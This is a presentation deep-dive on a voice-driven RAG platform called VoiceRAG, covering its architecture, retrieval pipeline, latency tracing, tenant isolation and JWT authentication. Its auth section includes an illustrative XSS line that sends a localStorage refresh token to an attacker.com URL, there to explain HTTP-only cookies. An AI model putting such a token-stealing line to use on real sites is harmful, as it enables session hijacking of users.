# VoiceRAG — Complete Technical Deep Dive for Presentation

> Covers: what, how, and WHY behind every decision — from architecture to line-level code.
> Use this to answer any critical question from evaluators.

---

## Table of Contents

1. [Project Summary (30-Second Pitch)](#1-project-summary)
2. [System Architecture — Big Picture](#2-system-architecture)
3. [Frontend — How It Works Internally](#3-frontend)
4. [Backend — How It Works Internally](#4-backend)
5. [RAG Pipeline — Full Technical Breakdown](#5-rag-pipeline)
6. [Voice Pipeline — Full Technical Breakdown](#6-voice-pipeline)
7. [Analytics — How Latency Is Measured](#7-analytics--latency-measurement)
8. [Multi-Tenant Architecture — Data Isolation](#8-multi-tenant-isolation)
9. [Authentication — JWT, bcrypt, Refresh Tokens](#9-authentication)
10. [Why These Technologies? (Decision Rationale)](#10-why-these-technologies)
11. [Known Limitations and Honest Trade-offs](#11-known-limitations)
12. [Critical Q&A — Expected Evaluator Questions](#12-critical-qa)

---

## 1. Project Summary

**What is VoiceRAG?**

A multi-tenant SaaS platform that lets any business deploy a voice-to-voice AI assistant trained on their own documents. You upload a PDF, and your users can talk to it in real-time — it speaks back with grounded, accurate answers from that document only.

**The 3-line technical pitch:**
> Users upload private documents (PDFs, DOCX). The system indexes them using vector embeddings. Users can ask questions by voice or text, and receive AI-generated spoken responses — sourced exclusively from those documents, not from the LLM's general knowledge.

**The 3-layer innovation:**
1. **RAG accuracy** — Score gate prevents hallucination; reranker improves precision
2. **Voice latency** — Streaming TTS starts speaking before full response is generated
3. **Multi-tenancy** — Every user has a completely isolated search index and database scope

---

## 2. System Architecture

### The 5 Services

```
┌──────────────────────────────────────────────────────────────────┐
│                        CLIENT BROWSER                            │
│   React 19 + Vite — Port 80 (production) / 5173 (dev)          │
│   Handles: UI, WebSocket, Audio capture, VAD, Playback          │
└────────────────────────┬─────────────────────────────────────────┘
                         │ HTTP REST + WebSocket
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│                   BACKEND (FastAPI) — Port 8000                  │
│   Handles: Auth, JWT, RAG pipeline, Chat, Voice orchestration,  │
│   Document upload, Multi-tenant isolation, Analytics             │
└──────┬─────────────────┬──────────────────────┬─────────────────┘
       │ HTTP            │ HTTP                 │ SQLAlchemy
       ▼                 ▼                      ▼
┌─────────────┐  ┌──────────────────┐  ┌──────────────────┐
│STT Service  │  │TTS Service       │  │PostgreSQL        │
│Port 8001    │  │Port 8002         │  │(Users, Docs,     │
│Faster-      │  │Kokoro (EN)       │  │Conversations,    │
│Whisper      │  │Edge-TTS (multi)  │  │API Keys)         │
│GPU/CPU      │  │GPU/CPU           │  └──────────────────┘
└─────────────┘  └──────────────────┘
```

### Why Microservices for STT and TTS?

STT and TTS are **compute-heavy** (GPU/CPU neural network inference). Separating them means:
1. They can be scaled independently (more TTS instances if needed)
2. They can be deployed on GPU machines without the entire backend needing GPU
3. If TTS crashes, the backend still works (text-only fallback)
4. Independent restarts without dropping WebSocket connections

---

## 3. Frontend

### Technology Choices

| Tech | Why Chosen |
|------|-----------|
| **React 19** | Component-based, reusable UI, state management with hooks |
| **Vite** | 10-100x faster development server vs Webpack |
| **WebSocket** | Real-time bidirectional for voice (HTTP request-response is too slow) |
| **@ricky0123/vad-web + ONNX** | On-device VAD = no round-trip to server to detect silence |

### How the Voice UI Works Internally

The voice pipeline is managed by a custom hook: `useVoiceConversation.js`.

**Step 1 — Microphone Capture**

```javascript
// MediaRecorder API captures audio from microphone
const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' })
```

**Step 2 — VAD (Voice Activity Detection) — On-Device**

VAD runs in the browser using ONNX Runtime (no server call):

```javascript
import { useMicVAD } from "@ricky0123/vad-web"

const vad = useMicVAD({
    onSpeechStart: () => {
        setStatus('listening')
        startRecording()
    },
    onSpeechEnd: (audioFloat32) => {
        // User stopped speaking — fire the audio to backend
        sendAudioToBackend(audioFloat32)
    }
})
```

**Why on-device VAD?**

If you sent audio to the server to detect silence, you'd have:
- 50ms network roundtrip per chunk
- Server processing time
- Result: 200-300ms delay after every silence before detecting end of speech

With on-device VAD:
- 0ms network latency
- VAD runs in a Web Worker (separate thread, doesn't freeze UI)
- Detects end of speech in ~10ms locally

**Step 3 — WebSocket Audio Streaming**

```javascript
// Audio is encoded as base64-WAV and streamed
const ws = new WebSocket('ws://backend:8000/voice/ws')

// Stream chunks while user is speaking
ws.send(JSON.stringify({
    type: 'audio_chunk',
    data: base64_wav_bytes   // ~300ms of audio per chunk
}))

// When VAD detects silence:
ws.send(JSON.stringify({ type: 'audio_commit' }))
// Backend processes everything received so far
```

**Why stream chunks + commit instead of sending full audio at the end?**

This enables:
1. **Partial transcriptions** — While user is still speaking, Whisper can transcribe earlier chunks
2. **Faster overall response** — Backend starts processing before user finishes (speculative execution)
3. **Barge-in** — If user speaks again while AI is talking, backend can cancel mid-response

**Step 4 — Receiving Audio Back**

```javascript
ws.onmessage = (event) => {
    const msg = JSON.parse(event.data)
    
    if (msg.type === 'audio_chunk') {
        // Decode base64 → WAV → AudioBuffer
        const audioBytes = atob(msg.data)
        const audioBuffer = await audioContext.decodeAudioData(audioBytes)
        
        // Queue for playback (gapless, sentence by sentence)
        audioQueue.push(audioBuffer)
        if (!isPlaying) playNext()
    }
    
    if (msg.type === 'transcription') {
        setTranscript(msg.text)   // Show what user said
    }
}
```

**Why queue audio instead of play immediately?**

Sentences arrive one by one. If you played each independently, you'd hear gaps between sentences. The queue chains them seamlessly.

**Step 5 — Barge-In (User Interrupts AI)**

```javascript
vad.onSpeechStart = () => {
    if (isAISpeaking) {
        // Stop current audio playback
        audioQueue.clear()
        currentSource?.stop()
        
        // Tell backend to cancel in-flight turn
        ws.send(JSON.stringify({ type: 'interrupt' }))
    }
    // Start recording new question
}
```

The backend (`_cancel_turn` in voice_service.py) cancels the async Task running the current turn — any in-flight TTS calls are abandoned.

---

## 4. Backend

### FastAPI Design

FastAPI uses Python's `async/await` model, which is critical:

```python
# Without async (blocking):
@app.post("/chat")
def chat(question: str):
    answer = groq.generate(question)  # Takes 2 seconds
    return answer
    # While waiting 2 seconds, ALL other users are blocked

# With async (non-blocking):
@app.post("/chat")
async def chat(question: str):
    answer = await groq.generate(question)  # Takes 2 seconds
    return answer
    # While waiting 2 seconds, FastAPI handles other requests
```

**Practical implication:** 100 simultaneous users can all ask questions. Without async, they'd queue up one at a time and user #100 would wait 200 seconds.

### Router Architecture

```
main.py
  ├── /auth        → auth.py         (register, login, refresh, verify-email)
  ├── /portal      → portal.py       (document upload, chat, voice for logged-in users)
  ├── /widget      → widget.py       (API-key-authenticated endpoints for embedded widget)
  ├── /api-keys    → api_keys.py     (create, list, revoke keys)
  ├── /analytics   → analytics.py   (per-user conversation history, latency stats)
  └── /admin       → admin.py        (platform-wide stats, user management)
```

### Dependency Injection Pattern

FastAPI uses function parameters for auth checking:

```python
# get_current_client is called BEFORE the route handler
# If JWT is invalid, request is rejected with 401 — handler never runs
@app.get("/documents")
async def list_documents(
    current_client: Client = Depends(get_current_client),  # Auth check here
    db: Session = Depends(get_db),
):
    # current_client is always a valid, authenticated user here
    return db.query(Document).filter(Document.client_id == current_client.id)
```

This ensures every protected route has guaranteed authentication without repeating auth code.

### SQLAlchemy ORM + Alembic

**ORM (Object-Relational Mapper):** Maps Python classes to database tables.

```python
# This Python class...
class Document(Base):
    __tablename__ = "documents"
    id = Column(Integer, primary_key=True)
    filename = Column(String)
    client_id = Column(Integer, ForeignKey("clients.id"))

# ...generates this SQL:
# CREATE TABLE documents (
#   id INTEGER PRIMARY KEY,
#   filename VARCHAR,
#   client_id INTEGER REFERENCES clients(id)
# )
```

**Alembic (Migrations):** When you change the schema, Alembic generates a migration script that safely transforms existing data without data loss.

---

## 5. RAG Pipeline

### What Problem RAG Solves

An LLM (ChatGPT, Llama) knows what was in its training data — but not your private documents. RAG bridges this:

```
Without RAG:
User: "What does section 5.2 of our internal report say?"
LLM: "I don't have access to your report." ❌

With RAG:
User: "What does section 5.2 of our internal report say?"
System: searches document → finds section 5.2 text → gives it to LLM
LLM: "Section 5.2 says [exact content from your document]." ✓
```

### Full RAG Pipeline — Every Step Explained

#### Step 1: Document Ingestion

**PDF Parsing (PyMuPDF):**

```python
import fitz  # PyMuPDF

doc = fitz.open("research.pdf")
for page in doc:
    blocks = page.get_text("dict")["blocks"]  # Get text with formatting
    for block in blocks:
        # Check font size, bold flag to detect headings
        if block["font_size"] > 16 or block["flags"] & 16:  # bold
            heading = block["text"]
        else:
            body_text = block["text"]
```

**Why not just `extract_text()`?**

Simple text extraction loses structure. PyMuPDF with `"dict"` mode gives you:
- Font size → detect headings
- Bold flag → detect section titles
- Page numbers → track location

**DOCX Parsing (python-docx):**

```python
from docx import Document
doc = Document("guide.docx")
for para in doc.paragraphs:
    if para.style.name.startswith("Heading"):
        # This is a heading (section boundary)
    else:
        body_text = para.text
```

#### Step 2: Hierarchical Chunking

This is one of the most important design decisions in the project.

**Simple chunking (naive approach):**
```
Full document → Split every 1000 characters → Chunks
```

**Problem:** A 1000-char chunk may cut a sentence or lose context.

**Hierarchical chunking (what VoiceRAG does):**
```
Full document
    ↓ Detect section boundaries (headings)
    ↓ Group text into sections (parents)
    ↓ Further split each section into smaller children

Parent (section): "Chapter 3: Machine Learning..."  (up to 2000 chars)
  ├── Child 1: "Machine learning is a subset..." (400 chars)
  ├── Child 2: "There are three main types..." (400 chars)
  └── Child 3: "Supervised learning uses..." (400 chars)
```

**Children** go into FAISS (small = precise vector search)
**Parents** go into a separate JSON store (large = full context for LLM)

**Why this structure?**

- FAISS finds the best matching CHILD (small = precise match)
- Then we swap it for the PARENT (large = full context, not just a fragment)
- Result: LLM gets a complete section, not a sentence fragment

```python
# Parent swap in chat_service.py
for chunk in top_5_reranked:
    parent = parent_store[chunk.parent_id]  # Get full section
    context_for_llm.append(parent.text)    # Give full context to LLM
```

#### Step 3: Embeddings

**What is an embedding?**

Every piece of text is converted to a vector of 384 numbers. Similar text → similar vectors.

```
"What is machine learning?" → [0.23, -0.41, 0.88, ..., 0.12]  (384 dims)
"Explain ML briefly"         → [0.24, -0.40, 0.87, ..., 0.11]  (very similar)
"What is the weather?"       → [0.91, 0.33, -0.21, ..., 0.66]  (very different)
```

**Model used:** `all-MiniLM-L6-v2` (from HuggingFace Sentence-Transformers)

- 384 dimensions (compact)
- Fast (100ms for 1000 chunks on CPU, 20ms on GPU)
- Strong semantic understanding (not just keyword matching)
- Free, open source

**Why not use OpenAI's text-embedding-ada-002?**
- Cost: $0.0001 per 1000 tokens (adds up for large docs)
- Privacy: sends your document to OpenAI's servers
- Latency: API round-trip adds 100-300ms per query
- MiniLM-L6-v2 is locally run, free, and fast enough for this use case

#### Step 4: FAISS Vector Search

```python
import faiss
import numpy as np

# At index time (once per document upload):
index = faiss.IndexFlatIP(384)   # IP = Inner Product (cosine similarity)
index.add(all_embeddings)        # Add all chunk embeddings

# At query time (every user question):
question_embedding = model.encode("What is machine learning?")
distances, indices = index.search(
    np.array([question_embedding]),
    k=40  # Return top 40 candidates
)
```

**Why FAISS instead of a vector database (Pinecone, Weaviate)?**

| Feature | FAISS | Pinecone/Weaviate |
|---------|-------|-------------------|
| Cost | Free | $70+/month |
| Privacy | Local (your server) | Cloud (data leaves) |
| Latency | <5ms (local) | 50-200ms (API call) |
| Scale | Up to ~10M vectors | Unlimited |
| Setup | Python library | Separate service |

For an FYP/startup with <100 clients, FAISS is simpler, faster, and free.

**Per-client isolation:**
```python
# Each user has their own FAISS index file
path = f"data/clients/{client_id}/faiss_index.bin"
index = faiss.read_index(path)
# User A's question never touches User B's index
```

#### Step 5: Re-ranking (BGE Cross-Encoder)

FAISS returns 40 candidates based on semantic similarity. But "similar text" ≠ "answers the question."

```
Question: "What is the fee structure?"

FAISS returns (semantic similarity):
1. "The fees are Rs 50,000 per semester."  [relevant ✓]
2. "Students must pay fees by October 15."  [not specific ✓]
3. "The fee policy was updated in 2023."   [barely relevant ✗]
...
```

BGE reranker asks specifically: "Does this passage ANSWER the question?"

```python
from sentence_transformers import CrossEncoder
reranker = CrossEncoder('mmarco-MiniLMv2-L12-H384-v1')

# Score each (question, chunk) pair
pairs = [(question, chunk) for chunk in faiss_top_40]
scores = reranker.predict(pairs)  # Score from -10 to +10

# Sort and keep top 5
ranked = sorted(zip(chunks, scores), key=lambda x: x[1], reverse=True)
top_5 = ranked[:5]
```

**Why 40 candidates → rerank → 5 final?**

- 40 from FAISS: high recall (cast wide net, don't miss anything)
- 5 to LLM: high precision (only send truly relevant chunks)

If you sent 40 directly to the LLM:
- More tokens = higher cost
- LLM "gets confused" by too much irrelevant context ("lost in the middle" problem)

#### Step 6: Score Gate (Preventing Hallucination)

```python
# In chat_service.py
MIN_RERANK_SCORE = 0.0  # Threshold for "relevant"

top_score = ranked[0][1]
if top_score < MIN_RERANK_SCORE:
    return "I don't have information about that in the provided documents."
    # LLM is NEVER called — no hallucination possible
```

**Why is this critical?**

Without the score gate:
```
Question: "What is the secret recipe?"
BGE scores: all chunks score -3.2 (none relevant)
Without gate: LLM still called with irrelevant context
LLM: "Based on the documents, the recipe involves..." [hallucinated]

With gate: Max score (-3.2) < 0.0 → Return "I don't have that"
LLM: never called
Result: Honest answer, no hallucination
```

#### Step 7: LLM Generation

```python
# Groq API (primary) — Llama 3.3 70B
from groq import Groq
client = Groq(api_key=GROQ_API_KEY)

response = client.chat.completions.create(
    model="llama-3.3-70b-versatile",
    messages=[
        {"role": "system", "content": SYSTEM_PROMPT.format(context=context)},
        {"role": "user", "content": question}
    ],
    stream=True  # Stream tokens as they're generated
)
```

**Grounding prompt design:**

The system prompt has strict rules:
```
"Answer ONLY from the CONTEXT block below.
If the answer is not there, say 'I don't have that information.'
Never guess, invent, or fill from general knowledge."
```

This is a **two-layer defense against hallucination**:
1. Layer 1: Score gate — if no relevant chunk, LLM never runs
2. Layer 2: Grounding prompt — even if LLM runs, it's instructed not to hallucinate

**Streaming:**

```python
# LLM streams one token at a time
for chunk in response:
    token = chunk.choices[0].delta.content
    yield {"type": "token", "content": token}
    # Each token is sent to frontend immediately
    # User sees words appearing as they're generated
```

**Why streaming?**

Without streaming: user waits 3-5 seconds, then sees full response
With streaming: user sees first word in <0.5 seconds, rest appears in real-time

#### Step 8: Query Rewriting

**Problem:**
```
Turn 1: "What are the admission requirements?"
AI: "The requirements are..."

Turn 2: "What about for CS specifically?"
AI searches for: "What about for CS specifically?"
FAISS: finds nothing (incomplete question)
```

**Solution:** Rewrite follow-up questions into standalone questions:

```python
# query_rewriter.py
def rewrite_if_needed(question: str, history: list) -> str:
    # Check if question is self-contained
    if is_complete_question(question):
        return question  # No rewrite needed
    
    # Ask LLM to expand it using conversation history
    rewritten = llm.generate(f"""
    Conversation so far: {history}
    Current question: "{question}"
    Rewrite as standalone: 
    """)
    # Output: "What are the CS-specific admission requirements?"
    return rewritten
```

---

## 6. Voice Pipeline

### Complete Voice Turn — Millisecond by Millisecond

```
t=0ms       User finishes speaking → VAD detects 500ms silence
t=0ms       Frontend sends "audio_commit" via WebSocket
t=0ms       Backend receives commit, starts _process_voice_turn()
            TIMER STARTS HERE (turn_start = time.time())

t=0ms       STT mark START
t=0ms       Send audio to Faster-Whisper service (HTTP POST to port 8001)
t=612ms     Whisper returns text: "Okay, what courses are in W department?"
t=612ms     STT mark END  →  STT latency = 612ms

t=615ms     Send transcription to frontend (user sees what they said)

t=617ms     RAG starts:
t=617ms     Retrieval mark START
t=617ms     Embed question → FAISS search (40 candidates)
t=622ms     BGE reranker scores 40 pairs
t=640ms     Top 5 chunks selected
t=640ms     Retrieval mark END  →  Retrieval latency = 23ms

t=640ms     LLM mark START
t=640ms     Groq starts streaming tokens
t=660ms     First tokens: "I'm sorry, but..."
            (each token takes ~1.25ms at 800 tok/s)

t=1100ms    First complete sentence detected: "I'm sorry, but I don't..."
t=1100ms    TTS mark START
t=1100ms    Send first sentence to Kokoro/Edge-TTS (HTTP POST to port 8002)
t=3700ms    First TTS audio bytes returned
t=3700ms    TTS mark END  →  TTS (1st) latency = 2590ms = 2.59s
t=3700ms    Send base64 audio to frontend via WebSocket
t=3700ms    FRONTEND STARTS PLAYING (user hears response!)

t=3700ms    LLM continues generating sentence 2...
t=4300ms    Second sentence complete → TTS for sentence 2
t=4800ms    Second TTS audio done → sent to frontend
...
t=7780ms    ALL sentences processed, all TTS audio sent
            TIMER ENDS HERE
            finish_trace() called → total = 7.78s
```

### Why TTS Takes 2.59s

Edge-TTS is a Microsoft cloud service. The call goes:
```
Backend → Internet → Microsoft Azure TTS → Internet → Backend
~200ms round-trip + synthesis time
```

Additionally, the Urdu/multilingual query triggered Edge-TTS (not Kokoro) because the question had pronunciation ambiguity, making it slower.

For English with Kokoro (local): ~100ms per sentence.
For multilingual with Edge-TTS: ~500-2500ms per sentence (network dependent).

### The "6.91" — Audio Duration vs Processing Latency

These are two completely different things:
```
Audio duration (6.91s): How long the user spoke
STT latency (612ms): How long Whisper took to process it

Faster-Whisper processes speech at ~11× real-time speed:
6.91 seconds of audio ÷ 11 = 0.63 seconds processing
(Actual was 612ms ≈ 0.61s) ✓
```

### How the Analytics Timer Works (From the Code)

```python
# voice_service.py line 602
turn_start = time.time()  # STARTS when audio is received

# analytics_service.py line 122
total_round_trip_ms = round((now - trace["start_time"]) * 1000, 2)
# "now" is set at the moment finish_trace() is called
# finish_trace() is called at line 842 — AFTER all sentences are processed

# So total = time from audio received → all TTS chunks sent
```

**The displayed metrics:**
```
STT: 612ms       = stt_end - stt_start
Retrieval: —     = retrieval_end - retrieval_start  (~23ms, rounds to display as —)
LLM: —           = llm_end - llm_start (just first token, very fast)
TTS (1st): 2.59s = tts_end - tts_start (only FIRST sentence)
Total: 7.78s     = everything from audio received → all audio sent
```

The gap between TTS (1st) end (3.7s) and Total (7.78s) = TTS for sentences 2 and 3.

---

## 7. Analytics & Latency Measurement

### How the Trace System Works

```python
# Start: beginning of a pipeline turn
trace_id = start_trace(conv_id, mode="voice", user_query="...")

# Mark: record timing events
mark(trace_id, "stt", "start")    # stt_start = time.perf_counter()
# ... do STT ...
mark(trace_id, "stt", "end")      # stt_end = time.perf_counter()

# Finish: compute all latencies
finish_trace(trace_id, ai_response=answer)
# Computes: stt_ms = (stt_end - stt_start) * 1000
# Stores ConversationEntry with all latencies in memory
```

**Why `time.perf_counter()` instead of `time.time()`?**

`perf_counter()` is a high-resolution monotonic clock (not affected by system clock changes, accurate to microseconds). `time.time()` can jump backward if NTP syncs. For latency measurements, `perf_counter()` is the correct choice.

### What "—" Means in the Dashboard

When a latency shows "—" (dash):
- Either the marks weren't set (stage was skipped)
- Or the latency was < ~5ms (rounds to negligible in display)

For retrieval and LLM, these are fast enough that they appear negligible relative to STT and TTS.

---

## 8. Multi-Tenant Isolation

### The Problem

If 100 companies upload their documents, how do you ensure:
- Company A's customers only search Company A's documents?
- Company B can't accidentally see Company A's data?

### Solution: Three Layers of Isolation

**Layer 1: Database-level (every query filtered by client_id)**
```python
# Every protected endpoint extracts client from JWT
current_client = verify_jwt(token)  # client_id = 42

# All DB queries include client_id filter
documents = db.query(Document).filter(
    Document.client_id == current_client.id  # client_id = 42
)
# SQL: SELECT * FROM documents WHERE client_id = 42
# Company B (client_id=99) never appears in results
```

**Layer 2: Separate FAISS indices (filesystem)**
```python
# Client A's index
path_a = "data/clients/42/faiss_index.bin"  # only Company A's chunks

# Client B's index
path_b = "data/clients/99/faiss_index.bin"  # only Company B's chunks

# Voice/chat pipeline always loads the current user's index
def _resolve_doc_service(client_id: str):
    return ClientDocumentService.get_or_create(client_id)
```

**Layer 3: Per-client document service singleton**
```python
class ClientDocumentService:
    _cache: dict[str, ClientDocumentService] = {}
    
    @classmethod
    def get_or_create(cls, client_id: str):
        if client_id not in cls._cache:
            cls._cache[client_id] = ClientDocumentService(client_id)
        return cls._cache[client_id]
```

Each client gets a dedicated service object that loads only their index.

### API Key Authentication (Widget)

For embedded widgets on third-party websites, JWT isn't practical. Instead:

```python
# Client generates key: POST /api-keys/regenerate
key = "vrag_" + secrets.token_hex(24)  # "vrag_a3b4c5..."
key_hash = hashlib.sha256(key.encode()).hexdigest()  # Store hash, not key

# Widget request: POST /widget/chat
# Header: X-API-Key: vrag_a3b4c5...
incoming_hash = sha256(incoming_key)
db_record = db.query(APIKey).filter(APIKey.key_hash == incoming_hash)
# Finds the client, routes to their isolated index
```

**Why hash the API key?**

If the database is leaked:
- With plain key: attacker has all keys → can impersonate all clients
- With hash: attacker has SHA-256 hashes → cannot reverse to original key → useless

---

## 9. Authentication

### JWT Lifecycle

```
1. Client registers: POST /auth/register
   - Password hashed with bcrypt (cost factor 12 = 2^12 iterations)
   - Creates: access_token (30 min) + refresh_token (7 days)
   - Access token stored in localStorage (JavaScript accessible)
   - Refresh token stored in HTTP-only cookie (JavaScript CANNOT access)

2. Authenticated request:
   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
   - Backend decodes + verifies signature
   - Extracts client_id, checks expiry
   - If valid: allows request
   - If expired: 401 Unauthorized

3. Token refresh (transparent to user):
   - Frontend detects 401
   - Sends refresh token cookie to POST /auth/refresh
   - Backend verifies refresh token in DB
   - Issues new access token
   - User stays logged in without re-entering password

4. Logout:
   - DELETE /auth/logout
   - Backend deletes refresh token from DB
   - Even if old access token is stolen, refresh no longer works
```

### Why HTTP-only Cookie for Refresh Token?

**XSS Attack Scenario:**
```javascript
// Malicious script injected into your site via XSS
const storedToken = localStorage.getItem('refresh_token')
fetch('https://attacker.com/steal?token=' + storedToken)
// Attacker has your refresh token → can stay logged in forever
```

HTTP-only cookies are **not accessible to JavaScript at all** — only the browser sends them automatically. Even if XSS runs in your page, it cannot read the refresh token.

### bcrypt Cost Factor

```python
import bcrypt

password = "MyPassword123"
# Cost 12 = 4096 iterations = ~100ms to hash
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))

# Attacker's brute force:
# At 100ms per attempt: 10 attempts/second
# Average 7-character password: 10^11 possibilities
# Time to crack: ~317 years on one machine
```

---

## 10. Why These Technologies?

### Why FastAPI over Flask/Django?

| Criteria | Flask | Django | FastAPI |
|---------|-------|--------|---------|
| Async support | Limited | Limited | Native |
| Auto validation | No | Partial | Yes (Pydantic) |
| Auto API docs | No | No | Yes (Swagger) |
| WebSocket support | No (ext) | No (ext) | Native |
| Performance | Medium | Slow | Fast |
| Learning curve | Easy | Hard | Medium |

FastAPI was chosen because:
1. WebSocket support is native (critical for voice streaming)
2. Async native = handle 100s of concurrent voice sessions
3. Pydantic auto-validates request bodies (type safety)

### Why Groq over OpenAI?

| Feature | OpenAI GPT-4o | Groq Llama 3.3 70B |
|---------|---------------|---------------------|
| Speed | ~100 tok/s | ~800 tok/s |
| Cost | $5/M tokens | $0.59/M tokens |
| Context window | 128K | 128K |
| Quality | Excellent | Very Good |
| Latency (first token) | ~1s | ~200ms |

For a voice assistant, every 100ms matters. Groq's 8x speed advantage = shorter pauses before AI speaks.

### Why FAISS over PostgreSQL pgvector?

pgvector is a PostgreSQL extension for vector search. Why FAISS?

| Feature | pgvector | FAISS |
|---------|----------|-------|
| Speed | ~50ms | ~5ms |
| Setup | Easy (PostgreSQL) | Python library |
| Multi-tenant | Harder (one table) | Easy (one file per client) |
| Persistence | DB-managed | File-managed |

FAISS is 10x faster and its file-per-client model naturally gives tenant isolation.

### Why Faster-Whisper over Google Speech API?

| Feature | Google Speech API | Faster-Whisper |
|---------|-------------------|----------------|
| Cost | $0.006/15 seconds | Free |
| Privacy | Google servers | Local |
| Languages | 100+ | 99 |
| Offline | No | Yes |
| Accuracy | Excellent | Excellent |
| Latency | ~300ms (API) | ~400ms (local GPU) |

For an FYP, paying Google per voice query is unsustainable. Local Whisper is free and comparably accurate.

### Why Hierarchical Chunking over Flat Chunking?

**Flat chunking problem:**
```
Chunk 47: "...is also important for admissions. Applications must be submitted..."
(Cut mid-paragraph → no context)

LLM gets: "Applications must be submitted"
LLM: "Submitted where? By when?" (insufficient context)
```

**Hierarchical chunking:**
```
Child 47 (for FAISS retrieval): "...is also important for admissions."
Parent section (for LLM): "Chapter 3: Admissions Policy
Applications must be submitted by December 31st.
The committee reviews academic records...
[full section, 1800 chars]"
```

Precision of retrieval (small children) + completeness of context (large parents) = better answers.

---

## 11. Known Limitations

Being honest about these shows maturity.

### 1. No GPU in Production Yet

TTS uses Edge-TTS (cloud) for non-English because local GPU inference isn't set up in Docker. This adds 500ms-2.5s latency for non-English. Mitigation: switch to a multilingual local TTS model (Coqui XTTS).

### 2. FAISS Not Persistent Across Docker Restarts (Without Volume)

FAISS index is saved to disk, but if Docker volume isn't configured, it's lost on restart. Fixed with: `- backend_data:/app/data` in docker-compose.yml.

### 3. Analytics In-Memory Only

`_entries` list in `analytics_service.py` lives in Python process memory. Server restart = all analytics gone. Fix: write entries to PostgreSQL on `finish_trace()`.

### 4. No Rate Limiting

A single user could make unlimited API calls, hammering Groq quota. Fix: add rate limiting middleware (Redis + sliding window counter).

### 5. Embedding Model Not Fine-Tuned

`all-MiniLM-L6-v2` is a general-purpose model. For domain-specific documents (medical, legal), a fine-tuned embedding model would improve retrieval precision by 15-30%.

---

## 12. Critical Q&A

**Q: What is RAG and why do you need it?**

A: RAG (Retrieval-Augmented Generation) lets an LLM answer questions about specific documents it was never trained on. Instead of relying on the model's parametric memory (training data), we retrieve relevant passages from the user's documents and give them to the model as context. This is essential because LLMs hallucinate answers they don't know — RAG replaces guessing with grounded retrieval.

---

**Q: How do you prevent the AI from hallucinating?**

A: Two independent layers:
1. **Score gate:** Before calling the LLM at all, we check if the best-matched chunk has a relevance score above 0.0. If not, we return "I don't have that information" and the LLM never runs.
2. **Grounding prompt:** The system prompt instructs the LLM to answer ONLY from the provided context and to explicitly say "I don't have that information" if the answer isn't there.

---

**Q: What's the difference between the embedding model and the LLM?**

A: They're completely different neural networks with different jobs:
- **Embedding model** (all-MiniLM-L6-v2): Converts text to a 384-number vector. Used for similarity search. Very fast, runs locally. Doesn't generate text.
- **LLM** (Llama 3.3 70B via Groq): Understands context and generates natural language responses. Runs on Groq's servers. Generates text.

The embedding model finds WHERE the answer is; the LLM generates HOW to express it.

---

**Q: How does multi-tenancy work? Can User A see User B's data?**

A: No, due to three independent isolation layers:
1. Every database query is filtered by `client_id` extracted from the JWT token
2. Every user has a separate FAISS index file on disk — vector searches never cross clients
3. The client document service is instantiated per-client, so even in-memory state is isolated

Even if the JWT token is valid, it contains `client_id` — so User A can only access data where `client_id = A`, never B.

---

**Q: Why does your voice pipeline have separate STT and TTS microservices instead of building it into the backend?**

A: Three reasons:
1. **GPU independence:** STT and TTS need heavy ML models. Running them as separate services means they can be deployed on GPU machines independently of the main backend
2. **Fault isolation:** If Whisper crashes or needs updating, the backend keeps running (text chat still works)
3. **Horizontal scaling:** If TTS becomes the bottleneck, you can run multiple TTS instances behind a load balancer without duplicating the backend

---

**Q: The total latency is 7.78s. Isn't that too slow for a voice assistant?**

A: Two clarifications:
1. The 7.78s is the **total turn time** from audio received to last sentence spoken — not the time until user hears anything. The user hears the first word after ~3.7s (STT + RAG + first TTS sentence)
2. The specific query triggered Edge-TTS (cloud) because of language ambiguity, adding ~2-2.5s. English queries with Kokoro (local) respond in ~1.5-2s end-to-end
3. For reference: Google Assistant's end-to-end latency is ~1-2s; Amazon Alexa is ~1-3s. VoiceRAG at 1.5-2s for English is competitive.

---

**Q: Why use LangChain for text splitting? Isn't that overkill?**

A: LangChain's `RecursiveCharacterTextSplitter` handles a specific problem: splitting at natural language boundaries (paragraphs, sentences, words) rather than blindly cutting at character N. It tries to split at `\n\n` first, then `\n`, then `. `, then ` `. This preserves semantic coherence in chunks. Writing this correctly from scratch would take significant effort and testing.

---

**Q: How does the barge-in (interruption) feature work?**

A: Frontend detects new speech via on-device VAD while audio is playing. It:
1. Stops audio playback immediately
2. Sends `{"type": "interrupt"}` via WebSocket
3. Backend calls `task.cancel()` on the in-flight asyncio Task
4. This propagates `CancelledError` through any awaited calls (TTS, LLM streaming)
5. Pending TTS chunks are discarded
6. Frontend starts recording the new question

The critical design is that the voice turn runs as a background asyncio Task — this is what makes cancellation possible without blocking the WebSocket receive loop.

---

**Q: What's the difference between a parent chunk and a child chunk?**

A: During document indexing:
- **Child chunks** (~400 chars): Small pieces of text embedded into FAISS. Their small size makes vector search precise — matching a question to a specific claim or fact.
- **Parent chunks** (~2000 chars): The full section that contains multiple children. Stored separately in `parent_store.json`.

At query time: FAISS finds the best-matching CHILD → we retrieve the PARENT → the LLM reads the full parent section. This gives the LLM enough surrounding context to answer without overloading the search with large text blocks.

---

**Q: How does the JWT refresh flow prevent session stealing?**

A: Access tokens (30 min) are short-lived — if stolen, they expire soon. Refresh tokens (7 days) are stored in HTTP-only cookies — JavaScript cannot read them, so XSS attacks cannot steal them. When a user logs out, the refresh token is deleted from the database — even if someone has the cookie, it won't work anymore. This is the industry-standard approach (used by Google, GitHub).

---

**Q: What would you change if you were to scale this to 10,000 concurrent users?**

A: Four main changes:
1. **FAISS → Qdrant or Milvus** — dedicated vector databases with replication, persistence, and horizontal scaling
2. **In-memory analytics → PostgreSQL** — current implementation loses data on restart
3. **Rate limiting** — Redis-based sliding window per client to prevent API quota exhaustion
4. **Kubernetes deployment** — auto-scale STT/TTS pods based on queue depth, not fixed instances

---

*End of document — covers every critical technical question likely to be asked in a presentation.*
